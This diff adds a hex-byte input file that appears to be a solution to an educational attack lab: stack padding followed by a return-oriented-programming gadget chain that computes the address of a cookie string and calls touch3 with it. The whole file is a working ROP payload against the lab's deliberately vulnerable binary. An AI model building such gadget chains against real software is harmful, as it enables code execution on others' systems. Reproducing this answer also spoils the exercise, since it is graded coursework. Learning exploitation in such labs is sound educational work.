@@ -1,0 +1,17 @@
+00 00 00 00 00 00 00 00 /* 0x28 bytes */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+06 1a 40 00 00 00 00 00 /* addr of movq %rbp,%rax */
+c5 19 40 00 00 00 00 00 /* addr of movq %rax,%rdi */
+ab 19 40 00 00 00 00 00 /* addr of pop %rax */
+48 00 00 00 00 00 00 00 /* bias of str addr  */
+dd 19 40 00 00 00 00 00 /* addr of movl %eax,%edx */
+34 1a 40 00 00 00 00 00 /* addr of movl %edx,%ecx  */
+13 1a 40 00 00 00 00 00 /* addr of movl %ecx,%esi */
+d6 19 40 00 00 00 00 00 /* addr of lea (%rdi,rsi,1),%rax */
+c5 19 40 00 00 00 00 00 /* addr of movq %rax,%rdi */
+fa 18 40 00 00 00 00 00 /* addr of touch3(%rdi) */
+35 39 62 39 39 37 66 61 /* str of cookie */
+00 /*  \0 */
